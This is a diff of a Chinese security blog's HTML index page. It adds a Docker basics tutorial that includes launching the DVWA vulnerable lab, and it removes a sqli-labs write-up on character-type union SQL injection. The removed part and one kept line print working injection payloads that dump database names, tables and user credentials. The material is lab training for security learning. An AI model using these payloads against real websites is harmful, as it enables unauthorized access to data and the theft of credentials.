+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>                              <span class="comment">// 镜像加速</span></span><br><span class="line">    <span class="string">&quot;https://docker.xuanyuan.me&quot;</span><span class="punctuation">,</span>                    <span class="comment">// 加速地址1</span></span><br><span class="line">    <span class="string">&quot;https://docker.m.daocloud.io&quot;</span>                   <span class="comment">// 加速地址2(备用)</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;log-driver&quot;</span><span class="punctuation">:</span> <span class="string">&quot;json-file&quot;</span><span class="punctuation">,</span>                         <span class="comment">// 日志驱动</span></span><br><span class="line">  <span class="attr">&quot;log-opts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;max-size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;100m&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;max-file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3&quot;</span> <span class="punctuation">&#125;</span><span class="comment">// 单个文件最大 100MB, 最多3个</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker info  <span class="comment"># 查看生效配置</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="2-4-Docker使用"><a href="#2-4-Docker使用" class="headerlink" title="2.4 Docker使用"></a>2.4 Docker使用</h4><h5 id="1-0-镜像管理"><a href="#1-0-镜像管理" class="headerlink" title="1.0 镜像管理"></a>1.0 镜像管理</h5><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像作者/镜像名:版本  <span class="comment"># 镜像下载</span></span><br><span class="line">docker pull 镜像名              <span class="comment"># 镜像下载简化版(默认下载官方)</span></span><br><span class="line">docker images                  <span class="comment"># 列出本地镜像</span></span><br><span class="line">Docker rmi 镜像ID               <span class="comment"># 删除镜像</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="2-0-容器管理"><a href="#2-0-容器管理" class="headerlink" title="2.0 容器管理"></a>2.0 容器管理</h5><ul>
+<li><p>容器查看</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps                      <span class="comment"># 查看运行中的容器</span></span><br><span class="line">docker ps -a                   <span class="comment"># 查看所有容器</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>容器创建</p>
+<p><code>docker run</code></p>
+<ul>
+<li><p>-d 后台运行</p>
+</li>
+<li><p>-p 80:80 端口映射(宿主机:容器端口)</p>
+</li>
+<li><p>–name xx (容器名)</p>
+</li>
+<li><p>案例</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80 --name mydvwa vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>vulnerables&#x2F;web-dvwa 镜像名 | 也可使用镜像ID</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>容器停止</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器ID</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>容器启动</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器ID</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>容器删除</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> 容器ID</span><br><span class="line">docker <span class="built_in">rm</span> -f 容器ID <span class="comment"># 强制删除</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进入容器</p>
+<p><code>docker exec</code></p>
+<ul>
+<li><p>-i 交互式</p>
+</li>
+<li><p>-t 终端分配</p>
+</li>
+<li><p>&#x2F;bin&#x2F;bash (&#x2F;bin&#x2F;bash 解释器启动)</p>
+</li>
+<li><p>案例</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it f6e351f39c79 /bin/bash</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>容器日志查看</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker logs 容器ID</span><br><span class="line">docker logs -f 容器ID <span class="comment"># 实时跟踪</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>多容器启动</p>
+<p><code>docker-compose up</code></p>
+<ul>
+<li>-d 根据docker compose.yml启动整套环境</li>
+<li>docker compose down关闭并移除整套环境</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1916,7 +2267,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-07-21 16:35:17" itemprop="dateModified" datetime="2026-07-21T16:35:17+08:00">2026-07-21</time>
+      <time title="Modified: 2026-08-12 16:53:37" itemprop="dateModified" datetime="2026-08-12T16:53:37+08:00">2026-08-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -3021,216 +3372,6 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=-admin<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) # &amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
 
 <p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/6.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/private/icon1.png">
-      <meta itemprop="name" content="Byron">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Byron">
-      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Byron">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/" class="post-title-link" itemprop="url">Character Type Union Injection</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-07-07 22:00:00 / Modified: 20:58:37" itemprop="dateCreated datePublished" datetime="2026-07-07T22:00:00+08:00">2026-07-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
-        </span>
-          , 
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web-security/sql-injection/" itemprop="url" rel="index"><span itemprop="name">sql-injection</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Environment: PHP 7.3.4 + MySQL 5.7.26</p>
-</blockquote>
-<blockquote>
-<p>Lab: sqli-labs Less-1, Less-3, &amp; Less-4</p>
-</blockquote>
-<hr>
-<h2 id="1-0-介绍"><a href="#1-0-介绍" class="headerlink" title="1.0 介绍"></a>1.0 介绍</h2><p>在上一篇文章[Union Injection]中, 逐步剖析了数字型注入(Less-2)关卡, 这篇文章开始转向<strong>字符型注入</strong>,他增加了一个关键步骤: <strong>符号闭合</strong>,也就是通过精心拼接单引号、双引号或括号，把原本破坏 SQL 语法的恶意输入“伪装”成合法的查询语句，从而成功注入我们想要的 Payload</p>
-<p><strong>为什么要学字符型注入?</strong></p>
-<p>在真实 Web 应用中，绝大多数用户输入的参数都是被引号包裹的字符串(如登录名、搜索关键词、文章标题),字符型注入的占比远高于数字型</p>
-<h3 id="1-1-SQL语句及URL中常用注释"><a href="#1-1-SQL语句及URL中常用注释" class="headerlink" title="1.1 SQL语句及URL中常用注释"></a>1.1 SQL语句及URL中常用注释</h3><table>
-<thead>
-<tr>
-<th>注释类型</th>
-<th>SQL 语句中的语法要求</th>
-<th>GET 请求 URL 中的写法</th>
-<th>POST 请求 Body 中的写法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>单行注释 <code>--</code></td>
-<td>两个减号后<strong>必须跟一个空格</strong>(或制表符等控制字符)</td>
-<td>用 <code>--+</code> 或 <code>--%20</code><br><code>+</code> 解码为空格，<code>%20</code> 也是空格</td>
-<td>直接写 <code>--</code> (减号后带空格)</td>
-</tr>
-<tr>
-<td>单行注释 <code>#</code></td>
-<td>从 <code>#</code> 开始到行尾的所有内容均为注释</td>
-<td><strong>必须编码为 <code>%23</code></strong><br>(浏览器默认将 <code>#</code> 解析为页面锚点, 不发送给服务器)</td>
-<td>直接写 <code>#</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="2-0-手工注入"><a href="#2-0-手工注入" class="headerlink" title="2.0 手工注入"></a>2.0 手工注入</h2><p><strong>01 判断有无注入点(Less-1)</strong></p>
-<ul>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 and 1&#x3D;1</span> → 页面正常返回值</li>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 and 1&#x3D;2</span> → 页面正常返回值</li>
-</ul>
-<blockquote>
-<p>分析: ?id&#x3D;1 and 1&#x3D;2 返回值应该为false, 故暂且认为该漏洞为字符类型</p>
-</blockquote>
-<p><strong>以下测试字符型:</strong></p>
-<ul>
-<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1’</span> → 报错</p>
-<p><img data-src="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/1.png"></p>
-</li>
-<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1’ and 1&#x3D;1 –+</span> → 页面正常返回值</p>
-<p><img data-src="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/2.png"></p>
-</li>
-<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1’ and 1&#x3D;2 –+</span> → 无返回值</p>
-<p><img data-src="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/3.png"></p>
-</li>
-</ul>
-<p><strong>按照上述方法,可构造出Less-3 &amp; Less-4 的闭合符号</strong></p>
-<table>
-<thead>
-<tr>
-<th align="center">Less-3</th>
-<th align="center">Less-4</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">?id&#x3D;’)</td>
-<td align="center">?id&#x3D;”)</td>
-</tr>
-</tbody></table>
-<p><strong>02 猜解列数</strong></p>
-<p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1’ order by 3 –+</span> → 正常返回</p>
-<p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1’ order by 4 –+</span> → 报错 <span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">Unknown column ‘4’ in ‘order clause’</span></p>
-<blockquote>
-<p>通过以上Payload可知,当前查询涉及的表共有 <strong>3 列</strong></p>
-</blockquote>
-<p><strong>03 定位回显</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/4.png"></p>
-<p><strong>通过以上步骤, 确定三个Less的基本信息如下:</strong></p>
-<table>
-<thead>
-<tr>
-<th align="center">Lab</th>
-<th align="center">Character</th>
-<th align="center">Column</th>
-<th align="center"><strong>display position</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">Less-1</td>
-<td align="center">‘</td>
-<td align="center">3</td>
-<td align="center">2, 3</td>
-</tr>
-<tr>
-<td align="center">Less-3</td>
-<td align="center">‘)</td>
-<td align="center">3</td>
-<td align="center">2, 3</td>
-</tr>
-<tr>
-<td align="center">Less-4</td>
-<td align="center">“)</td>
-<td align="center">3</td>
-<td align="center">2, 3</td>
-</tr>
-</tbody></table>
-<p><strong>综合以上信息,即可构建注入Payload:</strong></p>
-<ul>
-<li>爆数据库名</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,database(),null --+</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>爆所有表</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,group_concat(table_name),null from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>爆字段</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,group_concat(column_name),null from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>爆数据</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,group_concat(username,0x3a,password,0x0a),null from security.users --+</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/5.png"></p>
-<p><strong>综上, 完整注入(Less-1), 对Less-3 &amp; Less-4使用同样思路注入即可, 只需修改对应Payload中闭合字符</strong></p>
 
       
     </div>
